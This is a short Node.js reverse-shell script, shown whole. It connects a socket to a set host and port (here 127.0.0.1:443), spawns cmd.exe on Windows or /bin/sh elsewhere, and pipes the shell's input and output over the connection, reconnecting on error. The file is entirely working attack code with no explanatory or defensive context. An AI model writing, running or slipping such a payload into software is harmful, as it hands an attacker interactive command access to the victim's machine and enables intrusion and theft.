var os = require('os');
var net = require('net');
var child_process = require('child_process');
var path = require('path');

HOST="127.0.0.1";
PORT="443";
TIMEOUT="6000";

function reverseShell(HOST,PORT) {
    var client = new net.Socket();
    client.connect(PORT, HOST, function() {
        var shell_path = (os.platform().indexOf('win') != -1)  ? path.join(process.env.windir, 'System32', 'cmd.exe') : '/bin/sh';
        var cmd = child_process.spawn(shell_path);
        client.pipe(cmd.stdin);
        cmd.stdout.pipe(client);
        cmd.stderr.pipe(client);
    });
    client.on('error', function(e) {
        setTimeout(reverseShell(HOST,PORT), TIMEOUT);
    });
}

reverseShell(HOST,PORT);
